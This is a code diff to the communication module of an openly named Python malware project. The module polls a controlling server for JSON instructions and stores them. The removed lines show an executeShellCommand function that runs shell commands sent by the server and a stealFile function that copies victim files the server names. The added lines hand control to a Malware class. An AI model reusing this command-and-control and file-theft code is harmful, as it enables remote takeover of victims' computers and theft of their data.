@@ -1,4 +1,5 @@
 from Configuration import Configuration
+from Malware import Malware
 from Util import Util
 from threading import Thread
 from time import sleep
@@ -10,8 +11,10 @@ from shutil import copy
 
 class Communication(Thread):
 
-    def __init__(self, config:Configuration):
+
+    def __init__(self, malware:Malware, config:Configuration):
         Thread.__init__(self, name='communication')
+        self.__malware = malware
         self.__config = config
 
 
@@ -31,35 +34,11 @@ class Communication(Thread):
             data = response.json()
             print(data)
             if data:
-                self.executeShellCommand(data)
-                self.stealFile(data)
                 jsonData = dumps(data, ensure_ascii=False)
                 Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                 if self.__config.debug:
-                    print('config file has been created!')
+                    print('Config file has been created!')
+                self.__malware.setAttributes()
         except Exception:
             print('COMMUNICATION ERROR!')
 
-
-
-    def executeShellCommand(self, data:dict):
-        if data.get('shellcommand',''):
-            result = Util.executeShellCommand(data['shellcommand'])
-            Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
-            print('shell command executed!')
-
-
-
-    def stealFile(self, data:dict):
-        if data.get('stealpath',''):
-            stealPath = data['stealpath']
-            filename = stealPath.split('\\')[-1]
-            copy(stealPath, self.__config.logPath + filename)
-
-
-
-
-if __name__ == "__main__":
-    configuration = Configuration()
-    communication = Communication(configuration)
-    communication.start()
